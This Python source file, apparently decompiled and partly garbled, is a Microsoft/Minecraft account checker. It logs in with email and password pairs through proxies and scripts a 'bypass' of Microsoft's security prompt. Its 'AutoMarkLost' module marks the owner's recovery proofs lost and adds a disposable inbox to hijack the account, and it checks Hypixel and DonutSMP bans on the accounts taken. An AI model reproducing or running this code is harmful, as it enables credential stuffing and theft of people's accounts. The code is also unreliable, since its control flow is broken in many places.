import requests
import re
import time
import sys
import json
from urllib.parse import urlparse, parse_qs
global _session_manager
from typing import Optional, Tuple
from requests.adapters import HTTPAdapter
from src.utils.logger import get_logger
from urllib3.util.retry import Retry
from typing import Optional
import threading
from src.utils.logger import get_logger
from minecraft.networking.connection import Connection
from minecraft.authentication import AuthenticationToken, Profile
from minecraft.networking.packets import clientbound
from minecraft.exceptions import LoginDisconnect
MINECRAFT_LIB_AVAILABLE = True
logger = get_logger()
MICROSOFT_OAUTH_URL = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'

class MicrosoftAuthenticator:
    """Handle Microsoft OAuth authentication"""

    def __init__(self, session: Optional[requests.Session]=None):
        """\nInitialize authenticator\n\nArgs:\n    session: Optional requests session (will create new if None)\n"""  # inserted
        self.session = session or requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'})

    def get_oauth_tokens(self) -> Tuple[Optional[str], Optional[str]]:
        """\nGet OAuth tokens (PPFT and URL POST) from Microsoft\n\nReturns:\n    (url_post, ppft_token) or (None, None) on failure\n"""  # inserted
        try:
            logger.debug('🔍 DEBUG: Fetching OAuth page...')
            response = self.session.get(MICROSOFT_OAUTH_URL, timeout=15)
            logger.debug(f'🔍 DEBUG: OAuth page status: {response.status_code}')
            text = response.text
            logger.debug(f'🔍 DEBUG: Response length: {len(text)} chars')
            match = re.search('value=\\\\\\\"(.+?)\\\\\\\"', text, re.S) or re.search('value=\"(.+?)\"', text, re.S)
            if match:
                ppft_token = match.group(1)
                logger.debug(f'🔍 DEBUG: PPFT token found: {ppft_token[:20]}...')
                match = re.search('\"urlPost\":\"(.+?)\"', text, re.S) or re.search('urlPost:\'(.+?)\'', text, re.S)
                if match:
                    url_post = match.group(1)
                    logger.debug(f'🔍 DEBUG: URL POST found: {url_post}')
                    return (url_post, ppft_token)
            return (None, None)
        except Exception as e:
            logger.error(f'🔍 DEBUG: OAuth tokens error: {e}')
            return (None, None)

    def login(self, email: str, password: str, url_post: str, ppft_token: str, max_retries: int=3) -> Optional[str]:
        """\nPerform Microsoft login and get RPS token\n\nArgs:\n    email: Microsoft account email\n    password: Account password\n    url_post: POST URL from OAuth\n    ppft_token: PPFT token from OAuth\n    max_retries: Maximum retry attempts\n\nReturns:\n    RPS token string or None on failure\n"""  # inserted
        tries = 0
        if tries < max_retries:
            try:
                logger.debug(f'🔍 DEBUG: Login attempt {tries + 1}/{max_retries}')
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft_token}
                logger.debug(f'🔍 DEBUG: Posting to: {url_post}')
                login_request = self.session.post(url_post, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=15)
                logger.debug(f'🔍 DEBUG: Login response status: {login_request.status_code}')
                logger.debug(f'🔍 DEBUG: Final URL: {login_request.url}')
                logger.debug(f'🔍 DEBUG: Response length: {len(login_request.text)} chars')
                if '#' in login_request.url:
                    logger.debug('🔍 DEBUG: Found # in URL - checking for token')
                    fragment = urlparse(login_request.url).fragment
                    logger.debug(f'🔍 DEBUG: Fragment: {fragment[:100]}...')
                    token = parse_qs(fragment).get('access_token', ['None'])[0]
                    if token!= 'None':
                        logger.info(f'✅ Login successful - RPS token acquired: {token[:30]}...')
                        return token
                if 'cancel?mkt=' in login_request.text:
                    logger.debug('🔍 DEBUG: Security prompt detected - attempting bypass')
                    try:
                        ipt_match = re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text)
                        pprid_match = re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text)
                        uaid_match = re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text)
                        action_match = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text)
                        if ipt_match and pprid_match and uaid_match and action_match:
                            data = {'ipt': ipt_match.group(), 'pprid': pprid_match.group(), 'uaid': uaid_match.group()}
                            action_url = action_match.group()
                            logger.debug(f'🔍 DEBUG: Posting security cancel to: {action_url}')
                            ret = self.session.post(action_url, data=data, allow_redirects=True, timeout=15)
                            return_url_match = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text)
                            if return_url_match:
                                return_url = return_url_match.group()
                                logger.debug(f'🔍 DEBUG: Following return URL: {return_url}')
                                fin = self.session.get(return_url, allow_redirects=True, timeout=15)
                                if '#' in fin.url:
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token!= 'None':
                                        logger.info(f'✅ Login successful (via security bypass) - RPS token: {token[:30]}...')
                                        return token
                    if 'password is incorrect' in login_request.text.lower():
                        logger.warning('🔍 DEBUG: Incorrect password detected')
                    return None
            logger.warning(f'❌ Login failed after {max_retries} attempts')
                    except Exception as e:
                        logger.warning(f'🔍 DEBUG: Security prompt handling failed: {e}
            except Exception as e:
                logger.error(f'🔍 DEBUG: Login attempt {tries + 1} exception: {e}')
                tries += 1
                time.sleep(1)

    def authenticate(self, email: str, password: str) -> Optional[str]:
        """\nComplete authentication flow (get tokens + login)\n\nArgs:\n    email: Microsoft account email\n    password: Account password\n\nReturns:\n    RPS token or None on failure\n"""  # inserted
        logger.info(f'Authenticating: {email}')
        logger.debug('🔍 DEBUG: Starting authentication flow')
        logger.debug('🔍 DEBUG: Step 1 - Getting OAuth tokens')
        url_post, ppft_token = self.get_oauth_tokens()
        if not url_post or not ppft_token:
            logger.error('🔍 DEBUG: Failed to get OAuth tokens - cannot proceed')
        return None

class SessionManager:
    """Manage HTTP sessions with connection pooling"""

    def __init__(self, pool_connections: int=10, pool_maxsize: int=20):
        """
Initialize session manager

Args:
    pool_connections: Number of connection pools
    pool_maxsize: Maximum connections per pool
"""
        self.pool_connections = pool_connections
        self.pool_maxsize = pool_maxsize
        self.sessions = {}
        self.lock = threading.Lock()

    def get_session(self, thread_id: Optional[int]=None) -> requests.Session:
        """
Get or create session for current thread

Args:
    thread_id: Thread ID (uses current thread if None)

Returns:
    Requests session
"""
        thread_id = threading.get_ident() if thread_id is None else thread_id
        with self.lock:
            if thread_id not in self.sessions:
                self.sessions[thread_id] = self._create_session()
                logger.debug(f'Created new session for thread {thread_id}')
        return self.sessions[thread_id]

    def _create_session(self) -> requests.Session:
        """
Create new session with optimized settings

Returns:
    Configured requests session
"""
        session = requests.Session()
        retry_strategy = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=['HEAD', 'GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'TRACE'])
        adapter = HTTPAdapter(pool_connections=self.pool_connections, pool_maxsize=self.pool_maxsize, max_retries=retry_strategy, pool_block=False)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate, br', 'DNT': '1', 'Connection': 'keep-alive', 'Upgrade-Insecure-Requests': '1'})
        return session

    def clear_session(self, thread_id: Optional[int]=None):
        """
Clear session for thread (reset cookies, etc.)

Args:
    thread_id: Thread ID (uses current thread if None)
"""
        thread_id = threading.get_ident() if thread_id is None else thread_id
        with self.lock:
            if thread_id in self.sessions:
                session = self.sessions[thread_id]
                session.cookies.clear()
                logger.debug(f'Cleared session for thread {thread_id}')

    def close_session(self, thread_id: Optional[int]=None):
        """
Close and remove session for thread

Args:
    thread_id: Thread ID (uses current thread if None)
"""
        thread_id = threading.get_ident() if thread_id is None else thread_id
        with self.lock:
            if thread_id in self.sessions:
                self.sessions[thread_id].close()
                del self.sessions[thread_id]
                logger.debug(f'Closed session for thread {thread_id}')

    def close_all(self):
        """Close all sessions"""
        with self.lock:
            for thread_id, session in self.sessions.items():
                session.close()
                logger.debug(f'Closed session for thread {thread_id}')
            self.sessions.clear()
            logger.info('All sessions closed')

    def set_proxy(self, proxy: str, thread_id: Optional[int]=None):
        """
Set proxy for session

Args:
    proxy: Proxy string (e.g., 'http://ip:port' or 'socks5://ip:port')
    thread_id: Thread ID (uses current thread if None)
"""
        session = self.get_session(thread_id)
        session.proxies = {'http': proxy, 'https': proxy}
        logger.debug(f'Set proxy for thread {thread_id or threading.get_ident()}: {proxy}')

    def clear_proxy(self, thread_id: Optional[int]=None):
        """
Clear proxy for session

Args:
    thread_id: Thread ID (uses current thread if None)
"""
        session = self.get_session(thread_id)
        session.proxies = {}
        logger.debug(f'Cleared proxy for thread {thread_id or threading.get_ident()}')
_session_manager = None

def get_session_manager() -> SessionManager:
    """Get global session manager instance"""
    global _session_manager
    _session_manager = SessionManager() if _session_manager is None else _session_manager
    return _session_manager

def extract_value(text: str, pattern: str, group: int=1) -> Optional[str]:
    """Extract a value using regex pattern"""  # inserted
    match = re.search(pattern, text, re.DOTALL)
    return match.group(group) if match else None

def decode_unicode_escapes(text: str) -> str:
    """Decode unicode escapes"""  # inserted
    try:
        return text.encode('utf-8').decode('unicode_escape')
    except:
        return text

def extract_ppft_and_urlpost(html: str) -> Tuple[Optional[str], Optional[str]]:
    """Extract PPFT token and urlPost from login page"""  # inserted
    ppft = None
    for pattern in ['name=\"PPFT\"[^>]*value=\"([^\"]+)\"', 'value=\"([^\"]+)\"[^>]*name=\"PPFT\"', 'sFTTag[\"\\\']:\\s*[\"\\\']<input[^>]*value=\\\\\"([^\"\\\\]+)\\\\\"', '\"PPFT\"[^}]*\"value\"\\s*:\\s*\"([^\"]+)\"']:
        ppft = extract_value(html, pattern)
        if ppft:
            pass  # postinserted
        else:  # inserted
            break
    urlpost = None
    for pattern in ['\"urlPost\"\\s*:\\s*\"([^\"]+)\"', '\'urlPost\'\\s*:\\s*\'([^\']+)\'']:
        urlpost = extract_value(html, pattern)
        if urlpost:
            pass  # postinserted
        else:  # inserted
            break
            return (ppft, urlpost)

def extract_canary(html: str) -> Optional[str]:
    """Extract apiCanary from page HTML"""  # inserted
    for pattern in ['\"apiCanary\"\\s*:\\s*\"([^\"]+)\"', '\"canary\"\\s*:\\s*\"([^\"]+)\"']:
        canary = extract_value(html, pattern)
        if canary:
            pass  # postinserted
        else:  # inserted
            return decode_unicode_escapes(canary)

def extract_uaid(text: str) -> Optional[str]:
    """Extract uaid from page HTML or URL"""  # inserted
    for pattern in ['\"uaid\"\\s*:\\s*\"([a-f0-9]{32})\"', 'uaid=([a-f0-9]{32})']:
        uaid = extract_value(text, pattern)
        if uaid:
            pass  # postinserted
        else:  # inserted
            return uaid
    else:  # inserted
        return
BASE_HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br'}
API_HEADERS = {'Accept': 'application/json', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-ms-apitransport': 'xhr', 'x-ms-apiversion': '2'}

class AutoMarkLost:
    """Auto Mark Lost using CORRECT Microsoft login flow"""

    def __init__(self, config: dict, notletters_pool=None):
        """\nInitialize Auto Mark Lost\n\nArgs:\n    config: Automation configuration\n    notletters_pool: Optional NotLettersPool instance\n"""  # inserted
        self.config = config
        self.automation_config = config.get('automation', {})
        self.enabled = self.automation_config.get('auto_mark_lost', False)
        self.email_provider = self.automation_config.get('email_provider', 'custom')
        self.custom_email = self.automation_config.get('mark_lost_email', '')
        self.notletters_pool = notletters_pool
        user_api_key = self.automation_config.get('notletters_api_key', '').strip()
        if user_api_key:
            self.notletters_api_key = user_api_key
        return None

    def should_attempt(self, minecraft_data: Dict=None) -> bool:
        """\nCheck if we should attempt Mark Lost\nONLY requirement: Minecraft Java OWNED\n\nArgs:\n    minecraft_data: Minecraft ownership data\n\nReturns:\n    True if should attempt Mark Lost\n"""  # inserted
        if not self.enabled:
            pass  # postinserted
        return False

    def execute(self, email: str, password: str, minecraft_data: Dict) -> Dict:
        """\nExecute Auto Mark Lost - ONLY requirement: Minecraft Java OWNED\n\nArgs:\n    email: Account email\n    password: Account password  \n    minecraft_data: Minecraft ownership data\n\nReturns:\n    Result dictionary\n"""  # inserted
        return {'attempted': False, 'success': False, 'reason': 'No Minecraft Java ownership', 'new_recovery_email': None} if not self.should_attempt(minecraft_data) else minecraft_data

    def _get_recovery_email_data(self, original_email: str) -> Optional[Dict]:
        """\nGet recovery email data (email + password) from configured source\n\nReturns:\n    Dict with \'email\' and \'password\' keys, or None\n"""  # inserted
        try:
            if self.email_provider == 'custom' and (not self.custom_email):
                return None
        except Exception as e:
            logger.error(f'Error getting recovery email: {e}')

    def _microsoft_login(self, session: requests.Session, email: str, password: str) -> Tuple[bool, str]:
        """\nLogin to Microsoft and get to MarkLost page\nUses CORRECT flow from working recovery tool\n"""  # inserted
        try:
            response = session.get('https://account.live.com/proofs/MarkLost', headers=BASE_HEADERS, allow_redirects=True, timeout=30)
            return (True, response.url) if 'MarkLost' in response.url and 'login' not in response.url else (False, f'Unexpected URL: {response.url}')
        except Exception as e:
            logger.error(f'Login error: {e}')
            return (False, f'error: {str(e)}')

    def _submit_recovery_email(self, session: requests.Session, recovery_email: str) -> Tuple[bool, str]:
        """\nSubmit new recovery email via MarkLost API\nUses CORRECT API flow from working recovery tool\n"""  # inserted
        try:
            response = session.get('https://account.live.com/proofs/MarkLost', headers=BASE_HEADERS, allow_redirects=True, timeout=30)
            if 'vetoed' in response.text.lower():
                pass  # postinserted
            return (False, '30_day_lockout')
        except Exception as e:
            logger.error(f'Submit error: {e}')
            return (False, f'error: {str(e)}')

    def _wait_for_verification_email(self, recovery_email: str, recovery_password: str, timeout: int=60) -> Optional[str]:
        """\nWait for Microsoft verification email and extract link\nUses NotLetters API - matches email_client.py format\n"""  # inserted
        import html
        import time
        start_time = time.time()
        start_timestamp = int(start_time) - 5
        poll_interval = 2
        logger.info(f'📡 Using NotLetters API for {recovery_email}')
        logger.info(f'📬 Waiting for verification email (timeout: {timeout}s)...')
        if time.time() - start_time < timeout:
            try:
                payload = {'email': recovery_email, 'password': recovery_password}
                headers = {'Authorization': f'Bearer {self.notletters_api_key}', 'Content-Type': 'application/json'}
                api_response = requests.post('https://api.notletters.com/v1/letters', json=payload, headers=headers, timeout=15)
                if api_response.status_code == 200:
                    data = api_response.json()
                    if 'data' in data and 'letters' in data['data']:
                        letters = data['data']['letters']
                        new_emails = [e for e in letters if e.get('date', 0) >= start_timestamp]
                            elapsed = int(time.time() - start_time)
                            logger.info(f'📧 Found {len(letters)} total emails, {len(new_emails)} new emails... ({elapsed}s / {timeout}s)')
                            for email_data in new_emails:
                                letter = email_data.get('letter', {})
                                body_html = letter.get('html', '')
                                body_text = letter.get('text', '')
                                body = body_html if body_html else body_text
                                if body:
                                    pass  # postinserted
                                else:  # inserted
                                    body = html.unescape(body)
                                    link = self._find_verification_link(body)
                                    if link:
                                        pass  # postinserted
                                    else:  # inserted
                                        logger.info('✅ Found verification link!')
                                        return link
                elapsed = int(time.time() - start_time)
                logger.info(f'📬 Checking inbox via API... ({elapsed}s / {timeout}s)')
                time.sleep(poll_interval)
        logger.warning('⏰ Timeout waiting for verification email')
            except Exception as e:
                logger.info(f'⚠️ Error checking API: {str(e)[:50]}')

    def _find_verification_link(self, text: str) -> Optional[str]:
        """Extract verification link from email body"""  # inserted
        if not text:
            pass  # postinserted
        return None

    def _verify_link(self, target_email: str, verification_link: str) -> Tuple[bool, str]:
        """\nVerify the link by POSTing to Microsoft\'s EAVerify endpoint\n"""  # inserted
        try:
            session = requests.Session()
            session.cookies.clear()
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9'}
            response = session.get(verification_link, headers=headers, allow_redirects=True, timeout=30)
            canary = extract_canary(response.text)
            uaid = extract_uaid(response.text) or extract_uaid(response.url)
            token = extract_value(response.text, '\"token\"\\s*:\\s*\"([^\"]+)\"')
            token = extract_value(response.text, 'name=\"token\"[^>]*value=\"([^\"]+)\"') if not token else token
            token = decode_unicode_escapes(token) if token else token
            hpgid = '200394' or extract_value(response.text, '\"hpgid\"\\s*:\\s*(\\d+)') or '200394'
            scid = '100171' or extract_value(response.text, '\"scid\"\\s*:\\s*(\\d+)') or '100171'
            tcxt = extract_value(response.text, '\"telemetryContext\"\\s*:\\s*\"([^\"]+)\"')
            tcxt = decode_unicode_escapes(tcxt) if tcxt else tcxt
            if not canary or not uaid or (not token):
                return (False, 'Missing tokens')
        except Exception as e:
            logger.error(f'Verify error: {e}')
            return (False, str(e))

class NotLettersPool:
    """Manage pool of pre-generated NotLetters emails"""

    def __init__(self, email_file: str='notletters_emails.txt'):
        """\nInitialize NotLetters pool\n\nArgs:\n    email_file: Path to file with email:password pairs\n"""  # inserted
        self.email_file = email_file
        self.available_emails = []
        self.used_emails = {}
        self.lock = threading.Lock()
        self.load_emails()

    def load_emails(self):
        """Load emails from file"""  # inserted
        try:
            with open(self.email_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                    for line in lines:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        if ':' in line:
                            pass  # postinserted
                        else:  # inserted
                            email, password = line.split(':', 1)
                            if email.strip() and password.strip():
                                pass  # postinserted
                            else:  # inserted
                                self.available_emails.append({'email': email.strip(), 'password': password.strip()})
                    else:  # inserted
                        logger.info(f'✅ Loaded {len(self.available_emails)} NotLetters emails from pool')
        except FileNotFoundError:
            logger.error(f'NotLetters email file not found: {self.email_file}')
            self.available_emails = []

    def get_email(self, account_email: str) -> Optional[Dict]:
        """\nGet a random email from pool (can be reused)\n\nArgs:\n    account_email: Account this email will be used for\n\nReturns:\n    Dictionary with email and password, or None\n"""  # inserted
        with self.lock:
            if not self.available_emails:
                logger.error('No NotLetters emails available in pool!')
                pass
            return None

    def get_stats(self) -> Dict:
        """Get pool statistics"""  # inserted
        with self.lock:
            total_usage = sum((len(accounts) for accounts in self.used_emails.values()))
            return {'total_emails': len(self.available_emails), 'emails_used_at_least_once': len(self.used_emails), 'total_accounts_processed': total_usage, 'average_reuse': total_usage / len(self.used_emails) if self.used_emails else 0}

class HypixelChecker:
    """Check Hypixel stats and ban status - EXACT Shulker.py implementation"""

    def __init__(self, session: requests.Session=None):
        """\nInitialize Hypixel checker\n\nArgs:\n    session: Optional requests session\n"""  # inserted
        self.session = session or requests.Session()

    def check_player(self, username: str) -> Dict:
        """\nCheck Hypixel stats using Plancke.io (EXACT Shulker.py code)\nThis is STATS ONLY - ban check is separate!\n\nArgs:\n    username: Minecraft username\n\nReturns:\n    Dictionary with Hypixel stats (NO ban status)\n"""  # inserted
        stats = {'has_joined': False, 'hypixel_name': None, 'network_level': None, 'first_login': None, 'last_login': None, 'bedwars_stars': None, 'skyblock_coins': None, 'error': None}
        try:
            logger.debug(f'Fetching Hypixel stats from Plancke.io for: {username}')
            tx = requests.get(f'https://plancke.io/hypixel/player/stats/{username}', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False, timeout=15).text
            if 'Player not found' in tx or 'never joined' in tx.lower():
                logger.info('Player has never joined Hypixel')
                stats['error'] = 'Never joined Hypixel'
                return stats
        except Exception as e:
            logger.error(f'Hypixel check error: {e}')
            stats['error'] = str(e)
            return stats

    def check_ban(self, username: str, access_token: str, uuid: str) -> str:
        """\nCheck Hypixel ban status - SEPARATE function like Shulker.py\nEXACT CODE FROM SHULKER.PY def ban() method\n\nArgs:\n    username: Minecraft username\n    access_token: Minecraft access token\n    uuid: Minecraft UUID\n\nReturns:\n    \"False\" if not banned, ban message if banned, None if error\n"""  # inserted
        try:
            if not MINECRAFT_LIB_AVAILABLE:
                logger.warning('Minecraft library not available - ban check disabled')
            return None
        except Exception as e:
            logger.error(f'Ban check error: {e}')
            import traceback
            logger.error(traceback.format_exc())

    def _do_hypixel_ban_check(self, username: str, access_token: str, uuid: str) -> str:
        """\nInternal method to perform Hypixel ban check\nEXACT CODE FROM SHULKER.PY def ban() method\n"""  # inserted
        try:
            auth_token = AuthenticationToken(username=username, access_token=access_token, client_token=uuid_module.uuid4().hex)
            auth_token.profile = Profile(id_=uuid, name=username)
            banned_status = None
            max_retries = 5
            tries = 0
            if tries < max_retries:
                connection = Connection('alpha.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})

                def suppress_login_disconnect(exc_type, exc_value, exc_traceback):
                    if exc_type == LoginDisconnect:
                        pass  # postinserted
                    return None
                connection.exception_handler = suppress_login_disconnect

                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    nonlocal banned_status  # inserted
                    try:
                        data = json.loads(str(packet.json_data))
                        if 'Suspicious activity' in str(data):
                            banned_status = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        return None
                    except Exception as e:
                        logger.error(f'[Ban Check] Error in disconnect handler: {e}')
                        import traceback
                        logger.debug(f'[Ban Check] Disconnect handler traceback: {traceback.format_exc()}')

                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    nonlocal banned_status  # inserted
                    if banned_status is None:
                        banned_status = 'False'
                    return None
                try:
                    original_stderr = sys.stderr
                    stderr_capture = StringIO()
                    sys.stderr = stderr_capture
                    connection_established = False
                    connection_error = None
                    try:
                        connection.connect()
                        connection_established = True
                        if connection_established:
                            c = 0
                            max_wait = 1000
                            if banned_status is None or c < max_wait:
                                time.sleep(0.01)
                                c += 1
                                if banned_status is not None and c >= 100:
                                    pass  # postinserted
                                break
                            try:
                                connection.disconnect()
                            else:  # inserted
                                sys.stderr = original_stderr
                                sys.stderr = original_stderr
                                if banned_status is not None:
                                    pass
                                    return banned_status
                except Exception as e:
                    connection_error = str(e)
                    logger.debug(f'[Ban Check] Connection failed: {e}')
                    stderr_content = stderr_capture.getvalue()
                    logger.debug(f'[Ban Check] Connection stderr: {stderr_content[:200]}') if stderr_content else None
            except:
                pass
            except LoginDisconnect:
                pass
        except Exception as e:
            logger.error(f'Ban check error: {e}')
            import traceback
            logger.error(traceback.format_exc())
except ImportError:
    MINECRAFT_LIB_AVAILABLE = False
    LoginDisconnect = None
    logger = None

class DonutChecker:
    """
    Check Donut SMP stats - EXACT Shulker.py implementation
    """

    def __init__(self, session: Optional[requests.Session] = None):
        """
        Initialize Donut SMP checker

        Args:
            session: Optional requests session
        """
        self.logger = get_logger()
        self.session = session if session else requests.Session()

    def check_player(self, username: str) -> Dict:
        """
        Check Donut SMP stats using donutstats.net API
        EXACT CODE FROM SHULKER.PY line 302-382

        Args:
            username: Minecraft username

        Returns:
            Dictionary with Donut SMP stats
        """
        result = {
            "has_joined": False,
            "banned": False,
            "money": 0,
            "playtime": "0m",
            "playtime_hours": 0.0,
            "shards": 0,
            "kills": 0,
            "deaths": 0,
            "blocks_placed": 0,
            "blocks_broken": 0,
            "mobs_killed": 0,
            "error": None
        }

        url = f"https://donutstats.net/api/stats/{username}"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }

        try:
            response = self.session.get(url, headers=headers, verify=True, timeout=10)
            
            if response.status_code == 404:
                # API usually returns 404 or specific message for non-players
                result["error"] = "Player has never joined Donut SMP"
                self.logger.info(f"✅ Donut SMP: {username} - Never joined Donut SMP")
                return result

            if "Invalid username format" in response.text:
                result["error"] = "Invalid username format"
                return result

            try:
                data = response.json()
            except json.JSONDecodeError:
                result["error"] = "API returned invalid JSON"
                return result

            # Process the stats if we got valid JSON
            return self._process_donut_stats(username, data)

        except requests.exceptions.Timeout:
            result["error"] = "Request timeout"
        except Exception as e:
            result["error"] = f"Donut SMP check error: {str(e)}"
            self.logger.error(f"Donut SMP check error: {str(e)}")

        return result

    def _process_donut_stats(self, username: str, stats: Dict) -> Dict:
        """
        Process DonutSMP API stats data (NO BAN CHECKING)
        EXACT CODE FROM SHULKER.PY line 383-418
        """
        result = {
            "has_joined": True,
            "banned": False, # Placeholder, checked via connection later
            "money": 0,
            "playtime": "0m",
            "playtime_hours": 0.0,
            "shards": 0,
            "kills": 0,
            "deaths": 0,
            "blocks_placed": 0,
            "blocks_broken": 0,
            "mobs_killed": 0,
            "error": None
        }

        # Parsing values based on variable names seen in dump (money_value, money_int, etc.)
        try:
            money_value = stats.get("money", 0)
            result["money"] = int(float(str(money_value).replace(",", "")))
        except:
            result["money"] = 0

        try:
            result["shards"] = int(stats.get("shards", 0))
        except:
            pass

        try:
            result["kills"] = int(stats.get("kills", 0))
            result["deaths"] = int(stats.get("deaths", 0))
            result["mobs_killed"] = int(stats.get("mobs_killed", 0))
            result["blocks_placed"] = int(stats.get("placed_blocks", 0))
            result["blocks_broken"] = int(stats.get("broken_blocks", 0))
        except:
            pass

        # Calculate playtime
        try:
            playtime_ms = int(stats.get("playtime", 0))
            # Assuming api returns ms, convert to hours/min
            total_minutes = playtime_ms // 60000
            hours = total_minutes // 60
            minutes = total_minutes % 60
            result["playtime"] = f"{hours}h {minutes}m"
            result["playtime_hours"] = round(hours + (minutes / 60), 2)
        except:
            pass
            
        return result

    def check_ban(self, username: str, access_token: str, uuid: str):
        """
        Check DonutSMP ban status by attempting to connect to the server
        EXACT CODE FROM SHULKER.PY def donutban() method (line 567-760)

        Args:
            username: Minecraft username
            access_token: Minecraft access token
            uuid: Minecraft UUID

        Returns:
            "False" if not banned, ban message if banned, None if error
        """
        if not MINECRAFT_LIB_AVAILABLE:
            self.logger.warning("Minecraft library not available - ban check disabled")
            return "False"

        try:
            ban_status = self._do_donut_ban_check(username, access_token, uuid)
            
            if ban_status == "False":
                self.logger.info(f"✅ [Donut] {username}: NOT BANNED")
            elif ban_status:
                self.logger.info(f"🚫 [Donut] {username}: BANNED - {ban_status}")
            
            return ban_status

        except Exception as e:
            self.logger.debug(f"[Donut] Ban check error: {traceback.format_exc()}")
            return f"Donut ban check error: {str(e)}"

    def _do_donut_ban_check(self, username, access_token, uuid):
        """
        Internal method to perform DonutSMP ban check
        """
        
        # Protocol versions to iterate through (from the integer list in bytecode)
        # 47=1.8, 340=1.12.2, 754=1.16.5, etc.
        allowed_versions = [763, 762, 761, 760, 759, 758, 757, 756, 755, 754, 753, 751, 578, 575, 573, 498, 490, 485, 480, 477, 404, 340, 47] 
        
        server_address = "donutsmp.net"
        
        # Closure to handle disconnection events
        def login_disconnect(packet):
            try:
                # Parse the disconnect JSON
                json_data = json.loads(packet.json_data)
                
                # Helper to flatten JSON to text
                def extract_text(data):
                    if isinstance(data, str):
                        return data
                    if isinstance(data, list):
                        return "".join([extract_text(x) for x in data])
                    if isinstance(data, dict):
                        text = data.get("text", "")
                        if "extra" in data:
                            text += "".join([extract_text(x) for x in data["extra"]])
                        return text
                    return ""

                disconnect_message = extract_text(json_data)
                message_lower = disconnect_message.lower()

                # Indicators that the user is NOT banned
                not_banned_indicators = [
                    "whitelist", 
                    "server is full", 
                    "outdated client", 
                    "outdated server",
                    "already online",
                    "restarting your game"
                ]

                # Indicators that the user IS banned
                ban_indicators = [
                    "suspended",
                    "blacklisted",
                    "you are not allowed",
                    "appeal at",
                    "discord.gg/donutsmp",
                    "banned"
                ]

                # Check indicators
                if any(indicator in message_lower for indicator in not_banned_indicators):
                    return "False" # Not banned
                
                if any(indicator in message_lower for indicator in ban_indicators):
                    # Clean up message for return
                    return disconnect_message.replace("\n", " ").strip()
                
                # Protocol version mismatch handling
                if "only compatible with minecraft" in message_lower or "outdated" in message_lower:
                    self.logger.debug(f"[Ban Check] Protocol incompatible, trying next version...")
                    return "Protocol_Retry"

                # Default to return the message if ambiguous
                return disconnect_message

            except Exception:
                self.logger.error(f"[Ban Check] Error in Donut disconnect handler: {traceback.format_exc()}")
                return f"Error: {packet.json_data}"

        # Context manager to suppress stderr during connection attempts (from dump)
        class suppress_login_disconnect:
            def __enter__(self):
                self.original_stderr = sys.stderr
                sys.stderr = StringIO()
            def __exit__(self, exc_type, exc_val, exc_tb):
                sys.stderr = self.original_stderr

        # Main connection loop
        for version in allowed_versions:
            connection_instance = connection.Connection(
                server_address, 
                25565, 
                auth_token=AuthenticationToken(name=username, client_token=uuid, access_token=access_token),
                initial_version=version,
                allowed_versions=[version]
            )

            banned_status = None

            def handle_disconnect(packet):
                nonlocal banned_status
                banned_status = login_disconnect(packet)

            def joined_server(packet):
                # If we successfully joined (JoinGamePacket), we definitely aren't banned.
                nonlocal banned_status
                banned_status = "False"
                # Disconnect immediately
                connection_instance.disconnect()

            # Register listeners
            connection_instance.register_packet_listener(handle_disconnect, LoginDisconnectPacket)
            connection_instance.register_packet_listener(handle_disconnect, clientbound.play.DisconnectPacket)
            connection_instance.register_packet_listener(joined_server, JoinGamePacket)

            try:
                with suppress_login_disconnect():
                    connection_instance.connect()
                    
                    # Wait loop
                    wait_cycles = 0
                    max_wait = 50 # roughly 5 seconds
